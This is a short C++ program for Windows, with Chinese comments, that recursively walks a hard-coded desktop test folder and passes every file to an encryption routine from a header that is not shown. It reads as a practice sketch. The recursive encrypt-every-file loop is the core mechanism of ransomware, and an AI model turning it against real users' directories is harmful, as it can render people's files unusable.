#include <iostream>
#include <io.h>

#include "simple_crypt.h"
 
using namespace std;
 
int listFiles(const string& dir);
 
int main() {
	//目录路径
	string dir = "C:\\Users\\111\\Desktop\\测试文件夹";
	listFiles(dir);
	system("pause");
	return 1;
}
 
int listFiles(const string& dir) {
	//在目录后面加上"\\*.*"进行第一次搜索
	string newDir = dir + "\\*.*";
	//用于查找的句柄
	intptr_t handle;
	struct _finddata_t fileinfo;
	//第一次查找
	handle = _findfirst(newDir.c_str(), &fileinfo);
 
	if (handle == -1) {
		cout << "无文件" << endl;
		system("pause");
		return -1;
	}
 
	do
	{
		if (fileinfo.attrib & _A_SUBDIR) {//如果为文件夹，加上文件夹路径，再次遍历
			if (strcmp(fileinfo.name, ".") == 0 || strcmp(fileinfo.name, "..") == 0)
				continue;
 
			// 在目录后面加上"\\"和搜索到的目录名进行下一次搜索
			newDir = dir + "\\" + fileinfo.name;
			listFiles(newDir.c_str());
		}
		else
		{
			// 这就是一个文件了，只要对它加密就万事大吉了
			string file_path = dir + "\\" + fileinfo.name;
			cout << file_path.c_str() << endl;
			simple_crypt(file_path);
		}
		
	} while (!_findnext(handle, &fileinfo));
 
	_findclose(handle);
	return 0;
}

